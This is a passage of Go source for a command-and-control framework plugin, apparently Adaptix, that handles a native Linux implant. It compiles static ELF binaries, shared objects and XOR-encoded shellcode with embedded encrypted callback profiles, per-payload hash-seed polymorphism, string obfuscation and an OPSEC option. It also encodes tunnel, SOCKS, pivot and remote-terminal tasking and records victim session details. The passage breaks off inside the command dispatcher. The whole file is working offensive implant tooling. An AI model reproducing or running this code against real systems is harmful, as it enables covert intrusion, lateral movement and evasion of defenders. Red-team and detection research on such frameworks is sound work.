package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	mrand "math/rand/v2"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/Adaptix-Framework/axc2"
	"github.com/google/shlex"
	"github.com/vmihailenco/msgpack/v5"
)

type Teamserver interface {
	TsListenerInteralHandler(watermark string, data []byte) (string, error)

	TsAgentProcessData(agentId string, bodyData []byte) error

	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error
	TsAgentUpdateDataPartial(agentId string, updateData interface{}) error

	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
	TsAgentBuildLog(builderId string, status int, message string) error

	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)

	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
	TsGetPivotInfoByName(pivotName string) (string, string, string)
	TsGetPivotInfoById(pivotId string) (string, string, string)
	TsPivotDelete(pivotId string) error

	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, data adaptix.TaskData)
	TsTaskGetAvailableAll(agentId string, availableSize int) ([]adaptix.TaskData, error)

	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error

	TsScreenshotAdd(agentId string, Note string, Content []byte) error

	TsClientGuiDisksWindows(taskData adaptix.TaskData, drives []adaptix.ListingDrivesDataWin)
	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiFilesWindows(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataWin)
	TsClientGuiFilesUnix(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataUnix)
	TsClientGuiProcessWindows(taskData adaptix.TaskData, process []adaptix.ListingProcessDataWin)
	TsClientGuiProcessUnix(taskData adaptix.TaskData, process []adaptix.ListingProcessDataUnix)

	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelCreateSocks4(AgentId string, Info string, Lhost string, Lport int) (string, error)
	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)

	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelStopLportfwd(AgentId string, Port int)
	TsTunnelStopRportfwd(AgentId string, Port int)

	TsTunnelConnectionClose(channelId int, writeOnly bool)
	TsTunnelConnectionHalt(channelId int, errorCode byte)
	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)
	TsTunnelPause(channelId int)
	TsTunnelResume(channelId int)

	TsTerminalConnExists(terminalId string) bool
	TsTerminalGetPipe(AgentId string, terminalId string) (*io.PipeReader, *io.PipeWriter, error)
	TsTerminalConnResume(agentId string, terminalId string, ioDirect bool)
	TsTerminalConnData(terminalId string, data []byte)
	TsTerminalConnClose(terminalId string, status string) error

	TsConvertCpToUTF8(input string, codePage int) string
	TsConvertUTF8toCp(input string, codePage int) string
	TsWin32Error(errorCode uint) string
}

type PluginAgent struct{}

type ExtenderAgent struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string
)

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(Teamserver)
	return &PluginAgent{}
}

func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

func makeProxyTask(packData []byte) adaptix.TaskData {
	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: packData, Sync: false}
}

func getStringArg(args map[string]any, key string) (string, error) {
	v, ok := args[key].(string)
	if !ok {
		return "", fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getFloatArg(args map[string]any, key string) (float64, error) {
	v, ok := args[key].(float64)
	if !ok {
		return 0, fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getBoolArg(args map[string]any, key string) bool {
	v, _ := args[key].(bool)
	return v
}

/// TUNNEL

func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{
		ConnectTCP: TunnelMessageConnectTCP,
		ConnectUDP: TunnelMessageConnectUDP,
		WriteTCP:   TunnelMessageWriteTCP,
		WriteUDP:   TunnelMessageWriteUDP,
		Close:      TunnelMessageClose,
		Reverse:    TunnelMessageReverse,
		Pause:      TunnelMessagePause,
		Resume:     TunnelMessageResume,
	}
}

func TunnelMessageConnectTCP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	addr := fmt.Sprintf("%s:%d", address, port)
	packerData, _ := msgpack.Marshal(ParamsTunnelStart{Proto: "tcp", ChannelId: channelId, Address: addr})
	cmd := Command{Code: COMMAND_TUNNEL_START, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageConnectUDP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	addr := fmt.Sprintf("%s:%d", address, port)
	packerData, _ := msgpack.Marshal(ParamsTunnelStart{Proto: "udp", ChannelId: channelId, Address: addr})
	cmd := Command{Code: COMMAND_TUNNEL_START, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
	inner, _ := msgpack.Marshal(ParamsTunnelWrite{ChannelId: channelId, Data: data})
	cmd := Command{Code: COMMAND_TUNNEL_WRITE, Data: inner}
	packData, _ := msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
	inner, _ := msgpack.Marshal(ParamsTunnelWrite{ChannelId: channelId, Data: data})
	cmd := Command{Code: COMMAND_TUNNEL_WRITE, Data: inner}
	packData, _ := msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageClose(channelId int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTunnelStop{ChannelId: channelId})
	cmd := Command{Code: COMMAND_TUNNEL_STOP, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
	var packData []byte
	return makeProxyTask(packData)
}

func TunnelMessagePause(channelId int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTunnelPause{ChannelId: channelId})
	cmd := Command{Code: COMMAND_TUNNEL_PAUSE, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageResume(channelId int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTunnelResume{ChannelId: channelId})
	cmd := Command{Code: COMMAND_TUNNEL_RESUME, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

/// TERMINAL

func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{
		Start: TerminalMessageStart,
		Write: TerminalMessageWrite,
		Close: TerminalMessageClose,
	}
}

func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTerminalStart{TermId: terminalId, Program: program, Height: sizeH, Width: sizeW})
	cmd := Command{Code: COMMAND_TERMINAL_START, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TerminalMessageWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
	return makeProxyTask(data)
}

func TerminalMessageClose(terminalId int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTerminalStop{TermId: terminalId})
	cmd := Command{Code: COMMAND_TERMINAL_STOP, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

////// PLUGIN AGENT

type GenerateConfig struct {
	Format           string `json:"format"`
	Arch             string `json:"arch"`
	ReconnectTimeout string `json:"reconn_timeout"`
	ReconnectCount   int    `json:"reconn_count"`
	OpsecEnabled     bool   `json:"opsec_enabled"`
}

var SrcPath = "src_macos" // Go fallback (unused for native C builds)

func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var agentProfiles [][]byte

	for _, transportProfile := range profile.ListenerProfiles {

		var listenerMap map[string]any
		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
			return nil, err
		}

		var (
			generateConfig GenerateConfig
			profileData    []byte
		)

		err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
		if err != nil {
			return nil, err
		}

		agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
		if err != nil {
			return nil, err
		}

		listenerWatermark, err := strconv.ParseInt(transportProfile.Watermark, 16, 64)
		if err != nil {
			return nil, err
		}

		encrypt_key, _ := listenerMap["encrypt_key"].(string)
		encryptKey, err := hex.DecodeString(encrypt_key)
		if err != nil {
			return nil, err
		}

		reconnectTimeout, err := parseDurationToSeconds(generateConfig.ReconnectTimeout)
		if err != nil {
			return nil, err
		}

		protocol, _ := listenerMap["protocol"].(string)
		switch protocol {

		case "tcp":

			tcp_banner, _ := listenerMap["tcp_banner"].(string)

			servers, _ := listenerMap["callback_addresses"].(string)

			servers = strings.ReplaceAll(servers, " ", "")
			servers = strings.ReplaceAll(servers, "\n", ",")
			servers = strings.TrimSuffix(servers, ",")
			addresses := strings.Split(servers, ",")

			var sslKey []byte
			var sslCert []byte
			var caCert []byte
			Ssl, _ := listenerMap["ssl"].(bool)
			if Ssl {
				ssl_key, _ := listenerMap["client_key"].(string)
				sslKey, err = base64.StdEncoding.DecodeString(ssl_key)
				if err != nil {
					return nil, err
				}

				ssl_cert, _ := listenerMap["client_cert"].(string)
				sslCert, err = base64.StdEncoding.DecodeString(ssl_cert)
				if err != nil {
					return nil, err
				}

				ca_cert, _ := listenerMap["ca_cert"].(string)
				caCert, err = base64.StdEncoding.DecodeString(ca_cert)
				if err != nil {
					return nil, err
				}
			}

			profile := Profile{
				Type:              uint(agentWatermark),
				ListenerWatermark: uint(listenerWatermark),
				Addresses:         addresses,
				BannerSize:        len(tcp_banner),
				ConnTimeout:       reconnectTimeout,
				ConnCount:         generateConfig.ReconnectCount,
				UseSSL:            Ssl,
				SslCert:           sslCert,
				SslKey:            sslKey,
				CaCert:            caCert,
			}
			profileData, _ = msgpack.Marshal(profile)

		case "bind_tcp":
			port, _ := listenerMap["port_bind"].(float64)

			profile := Profile{
				Type:              uint(agentWatermark),
				ListenerWatermark: uint(listenerWatermark),
				Addresses:         []string{},
				BannerSize:        0,
				ConnTimeout:       0,
				ConnCount:         0,
				BindPort:          int(port),
			}
			profileData, _ = msgpack.Marshal(profile)

		default:
			return nil, errors.New("protocol unknown")
		}

		extHandler := ExtenderAgent{}
		profileData, _ = extHandler.Encrypt(profileData, encryptKey)
		profileData = append(encryptKey, profileData...)

		profileString := ""
		for _, b := range profileData {
			profileString += fmt.Sprintf("\\x%02x", b)
		}
		agentProfiles = append(agentProfiles, []byte(profileString))
	}
	return agentProfiles, nil
}

/// Native C agent build constants

var (
	NativeSrcDir   = "src_agent/agent"
	NativeObjFiles = []string{"crt", "msgpack", "crypt", "connector", "agent_info", "commander", "tasks_fs", "tasks_proc", "tasks_linux", "tasks_opsec", "jobs", "tasks_async", "tasks_net", "proxyfire", "elf_resolve", "opsec", "pivot", "tasks_pivot", "ax_vsnprintf", "bof_api", "elf_bof"}
)

// Compiler selection based on architecture
func nativeCompiler(arch string) string {
	if arch == "aarch64" || arch == "arm64" {
		return "aarch64-linux-gnu-gcc"
	}
	return "musl-gcc"
}

func nativeCFlags(arch string) string {
	base := "-std=gnu11 -Os -fno-stack-protector -fno-builtin -fno-unwind-tables -fno-asynchronous-unwind-tables -fno-ident -Wall -Wextra -Wno-unused-parameter -Wno-unused-function"
	if arch == "aarch64" || arch == "arm64" {
		return base + " -DARCH_AARCH64"
	}
	return base + " -DARCH_X86_64"
}

func nativeLFlags(arch string) string {
	if arch == "aarch64" || arch == "arm64" {
		return "-static -nostdlib -nodefaultlibs -s -Wl,--build-id=none"
	}
	return "-static -nostdlib -nodefaultlibs -s -Wl,--build-id=none"
}

func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	var generateConfig GenerateConfig

	err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
	if err != nil {
		return nil, "", err
	}

	currentDir := ModuleDir
	tempDir, err := os.MkdirTemp("", "ax-linux-*")
	if err != nil {
		return nil, "", err
	}

	arch := generateConfig.Arch
	if arch == "" {
		arch = "x86_64"
	}

	switch generateConfig.Format {
	case "Binary ELF (Native)":
		return p.buildNativeELF(profile, agentProfiles, generateConfig, currentDir, tempDir, arch)
	case "Shared Object (Native)":
		return p.buildNativeSO(profile, agentProfiles, generateConfig, currentDir, tempDir, arch)
	case "Shellcode x86_64 (Native)":
		return p.buildNativeShellcodeX64(profile, agentProfiles, generateConfig, currentDir, tempDir)
	case "Shellcode ARM64 (Native)":
		return p.buildNativeShellcodeARM64(profile, agentProfiles, generateConfig, currentDir, tempDir)
	default:
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("unknown format: %s", generateConfig.Format)
	}
}

// buildNativeELF — Static ELF binary (no dynamic dependencies)
func (p *PluginAgent) buildNativeELF(profile adaptix.BuildProfile, agentProfiles [][]byte, generateConfig GenerateConfig, currentDir string, tempDir string, arch string) ([]byte, string, error) {
	Filename := "agent_native.elf"
	buildPath := tempDir + "/" + Filename

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Target: linux/%s (Native C, ELF static)", arch))

	srcDir := NativeSrcDir

	// Step 1: Generate per-payload headers
	configContent := generateNativeConfig(agentProfiles)
	if err := os.WriteFile(tempDir+"/config.h", []byte(configContent), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write config.h: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Config: %d profile(s) embedded", len(agentProfiles)))

	djb2Seed := cryptoRandUint32()
	if err := os.WriteFile(tempDir+"/ApiDefines.h", []byte(generateLinuxApiDefines(djb2Seed)), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write ApiDefines.h: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("DJB2 seed: 0x%08x (per-payload polymorphism)", djb2Seed))

	if err := os.WriteFile(tempDir+"/strings_obf.h", []byte(generateObfStrings()), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write strings_obf.h: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "XOR string obfuscation generated (per-payload key)")

	// Step 2: Compile
	compiler := nativeCompiler(arch)
	cFlags := fmt.Sprintf("%s -I %s -I %s -DDJB2_SEED=%dU", nativeCFlags(arch), tempDir, srcDir, djb2Seed)
	if generateConfig.OpsecEnabled {
		cFlags += " -DOPSEC_ENABLED"
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling native agent sources (per-payload)...")

	compileSrc := func(srcFile string, outputName string) error {
		outPath := tempDir + "/" + outputName + ".o"
		cmdStr := fmt.Sprintf("%s %s -c %s -o %s", compiler, cFlags, srcFile, outPath)
		return Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", cmdStr)
	}

	for _, ofile := range NativeObjFiles {
		if err := compileSrc(srcDir+"/"+ofile+".c", ofile); err != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", fmt.Errorf("compile %s: %w", ofile, err)
		}
	}
	if err := compileSrc(srcDir+"/main.c", "main"); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("compile main: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "All sources compiled successfully")

	// Step 3: Link
	var objectFiles []string
	for _, ofile := range NativeObjFiles {
		objectFiles = append(objectFiles, tempDir+"/"+ofile+".o")
	}
	objectFiles = append(objectFiles, tempDir+"/main.o")

	lFlags := nativeLFlags(arch)
	linkCmd := fmt.Sprintf("%s %s -o %s %s", compiler, lFlags, buildPath, strings.Join(objectFiles, " "))
	if err := Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", linkCmd); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("link: %w", err)
	}

	// Step 4: Read output
	Payload, err := os.ReadFile(buildPath)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}
	_ = os.RemoveAll(tempDir)
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes (native ELF %s)", len(Payload), arch))

	return Payload, Filename, nil
}

// buildNativeSO — Shared Object (dlopen-loadable)
func (p *PluginAgent) buildNativeSO(profile adaptix.BuildProfile, agentProfiles [][]byte, generateConfig GenerateConfig, currentDir string, tempDir string, arch string) ([]byte, string, error) {
	Filename := "agent_native.so"
	buildPath := tempDir + "/" + Filename

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Target: linux/%s (Native C, SO)", arch))

	srcDir := NativeSrcDir

	// Generate per-payload headers
	configContent := generateNativeConfig(agentProfiles)
	if err := os.WriteFile(tempDir+"/config.h", []byte(configContent), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write config.h: %w", err)
	}

	djb2Seed := cryptoRandUint32()
	if err := os.WriteFile(tempDir+"/ApiDefines.h", []byte(generateLinuxApiDefines(djb2Seed)), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write ApiDefines.h: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("DJB2 seed: 0x%08x", djb2Seed))

	if err := os.WriteFile(tempDir+"/strings_obf.h", []byte(generateObfStrings()), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write strings_obf.h: %w", err)
	}

	// Compile with -fPIC -DBUILD_SO
	compiler := nativeCompiler(arch)
	cFlags := fmt.Sprintf("%s -fPIC -DBUILD_SO -I %s -I %s -DDJB2_SEED=%dU", nativeCFlags(arch), tempDir, srcDir, djb2Seed)
	if generateConfig.OpsecEnabled {
		cFlags += " -DOPSEC_ENABLED"
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling native agent sources (SO mode, per-payload)...")

	compileSrc := func(srcFile string, outputName string) error {
		outPath := tempDir + "/" + outputName + ".o"
		cmdStr := fmt.Sprintf("%s %s -c %s -o %s", compiler, cFlags, srcFile, outPath)
		return Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", cmdStr)
	}

	for _, ofile := range NativeObjFiles {
		if err := compileSrc(srcDir+"/"+ofile+".c", ofile); err != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", fmt.Errorf("compile %s: %w", ofile, err)
		}
	}
	if err := compileSrc(srcDir+"/main.c", "main"); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("compile main: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "All sources compiled (SO mode)")

	// Link as shared object
	var objectFiles []string
	for _, ofile := range NativeObjFiles {
		objectFiles = append(objectFiles, tempDir+"/"+ofile+".o")
	}
	objectFiles = append(objectFiles, tempDir+"/main.o")

	linkCmd := fmt.Sprintf("%s -shared -nostdlib -nodefaultlibs -s -Wl,--build-id=none -o %s %s", compiler, buildPath, strings.Join(objectFiles, " "))
	if err := Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", linkCmd); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("link SO: %w", err)
	}

	Payload, err := os.ReadFile(buildPath)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}
	_ = os.RemoveAll(tempDir)
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes (native SO %s)", len(Payload), arch))

	return Payload, Filename, nil
}

// buildNativeShellcodeX64 — SO + XOR encoder with x86_64 decoder stub
func (p *PluginAgent) buildNativeShellcodeX64(profile adaptix.BuildProfile, agentProfiles [][]byte, generateConfig GenerateConfig, currentDir string, tempDir string) ([]byte, string, error) {
	Filename := "agent_shellcode.x64.bin"

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Target: linux/x86_64 (Shellcode, Native C)")

	// Build SO first
	soPayload, _, err := p.buildNativeSO(profile, agentProfiles, generateConfig, currentDir, tempDir, "x86_64")
	if err != nil {
		return nil, "", err
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("SO size: %d bytes, encoding with XOR...", len(soPayload)))

	shellcode, err := xorEncodeShellcodeX64(soPayload)
	if err != nil {
		return nil, "", fmt.Errorf("xor encode x64: %w", err)
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, fmt.Sprintf("Shellcode size: %d bytes (SO %d + stub)", len(shellcode), len(soPayload)))

	return shellcode, Filename, nil
}

// buildNativeShellcodeARM64 — SO + XOR encoder with ARM64 decoder stub
func (p *PluginAgent) buildNativeShellcodeARM64(profile adaptix.BuildProfile, agentProfiles [][]byte, generateConfig GenerateConfig, currentDir string, tempDir string) ([]byte, string, error) {
	Filename := "agent_shellcode.arm64.bin"

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Target: linux/aarch64 (Shellcode ARM64, Native C)")

	// Build SO first (ARM64)
	soPayload, _, err := p.buildNativeSO(profile, agentProfiles, generateConfig, currentDir, tempDir, "aarch64")
	if err != nil {
		return nil, "", err
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("SO size: %d bytes, encoding with XOR...", len(soPayload)))

	shellcode, err := xorEncodeShellcodeARM64(soPayload)
	if err != nil {
		return nil, "", fmt.Errorf("xor encode arm64: %w", err)
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, fmt.Sprintf("Shellcode size: %d bytes (SO %d + stub)", len(shellcode), len(soPayload)))

	return shellcode, Filename, nil
}

// parseEscapedBytes converts "\x01\x02\xff" to raw bytes
func parseEscapedBytes(escaped []byte) []byte {
	s := string(escaped)
	var result []byte
	for i := 0; i < len(s); {
		if i+3 < len(s) && s[i] == '\\' && s[i+1] == 'x' {
			b, err := strconv.ParseUint(s[i+2:i+4], 16, 8)
			if err == nil {
				result = append(result, byte(b))
				i += 4
				continue
			}
		}
		result = append(result, s[i])
		i++
	}
	return result
}

// generateNativeConfig creates config.h with encrypted profiles as C byte arrays
func generateNativeConfig(agentProfiles [][]byte) string {
	var sb strings.Builder
	sb.WriteString("// Auto-generated — per-payload config\n")
	sb.WriteString("// Do not edit. Regenerated on each build.\n")
	sb.WriteString("#ifndef CONFIG_H\n#define CONFIG_H\n\n")
	sb.WriteString("#include <stdint.h>\n\n")
	sb.WriteString(fmt.Sprintf("#define PROFILE_COUNT %d\n\n", len(agentProfiles)))

	for i, escapedProf := range agentProfiles {
		rawProf := parseEscapedBytes(escapedProf)
		sb.WriteString(fmt.Sprintf("static const uint8_t enc_profile_%d[] = {\n    ", i))
		for j := 0; j < len(rawProf); j++ {
			if j > 0 && j%16 == 0 {
				sb.WriteString("\n    ")
			}
			sb.WriteString(fmt.Sprintf("0x%02x", rawProf[j]))
			if j < len(rawProf)-1 {
				sb.WriteString(", ")
			}
		}
		sb.WriteString("\n};\n")
		sb.WriteString(fmt.Sprintf("static const uint32_t enc_profile_%d_size = %d;\n\n", i, len(rawProf)))
	}

	sb.WriteString("static const uint8_t* enc_profiles[] = {\n")
	for i := range agentProfiles {
		sb.WriteString(fmt.Sprintf("    enc_profile_%d,\n", i))
	}
	sb.WriteString("};\n\n")

	sb.WriteString("static const uint32_t enc_profile_sizes[] = {\n")
	for i := range agentProfiles {
		sb.WriteString(fmt.Sprintf("    enc_profile_%d_size,\n", i))
	}
	sb.WriteString("};\n\n")

	sb.WriteString("#endif // CONFIG_H\n")
	return sb.String()
}

func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData

	var sessionInfo SessionInfo
	err := msgpack.Unmarshal(beat, &sessionInfo)
	if err != nil {
		return adaptix.AgentData{}, nil, err
	}

	agentData.ACP = int(sessionInfo.Acp)
	agentData.OemCP = int(sessionInfo.Oem)
	agentData.Pid = fmt.Sprintf("%v", sessionInfo.PID)
	agentData.Tid = ""
	agentData.Elevated = sessionInfo.Elevated
	agentData.InternalIP = sessionInfo.Ipaddr

	if sessionInfo.Os == "linux" {
		agentData.Os = adaptix.OS_LINUX
		agentData.OsDesc = sessionInfo.OSVersion
		// Determine arch from OS version string or default
		agentData.Arch = "x86_64"
		if strings.Contains(sessionInfo.OSVersion, "aarch64") || strings.Contains(sessionInfo.OSVersion, "arm64") {
			agentData.Arch = "arm64"
		}
	} else {
		agentData.Os = adaptix.OS_UNKNOWN
		return agentData, nil, errors.New("linux agent received non-linux OS")
	}

	agentData.SessionKey = sessionInfo.EncryptKey
	agentData.Domain = ""
	agentData.Computer = sessionInfo.Host
	agentData.Username = sessionInfo.User
	agentData.Process = sessionInfo.Process

	agentData.Sleep = 0
	agentData.Jitter = 0

	return agentData, &ExtenderAgent{}, nil
}

/// AGENT HANDLER

func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)

	return ciphertext, nil
}

func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	var packData []byte

	var objects [][]byte
	var command Command

	for _, taskData := range tasks {
		taskId, err := strconv.ParseUint(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}

		_ = msgpack.Unmarshal(taskData.Data, &command)
		command.Id = uint(taskId)

		cmd, _ := msgpack.Marshal(command)

		objects = append(objects, cmd)
	}

	message := Message{
		Type:   1,
		Object: objects,
	}

	packData, _ = msgpack.Marshal(message)

	return packData, nil
}

func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	id, _ := strconv.ParseUint(pivotId, 16, 64)

	// Build Command{code: PIVOT_EXEC, data: {pivot_id, data}}
	innerData, _ := msgpack.Marshal(ParamsPivotExec{
		PivotId: uint32(id),
		Data:    data,
	})
	cmd := Command{
		Code: COMMAND_PIVOT_EXEC,
		Data: innerData,
	}
	packData, _ := msgpack.Marshal(cmd)

	taskData := adaptix.TaskData{
		TaskId: fmt.Sprintf("%08x", mrand.Uint32()),
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
		Data:   packData,
		Sync:   false,
	}

	return taskData, nil
}

func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}
	subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: adaptix.TASK_TYPE_TASK,
		Sync: true,
	}

	messageData = adaptix.ConsoleMessageData{
		Status: adaptix.MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	var cmd Command

	switch command {

	case "cat":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsCat{Path: path})
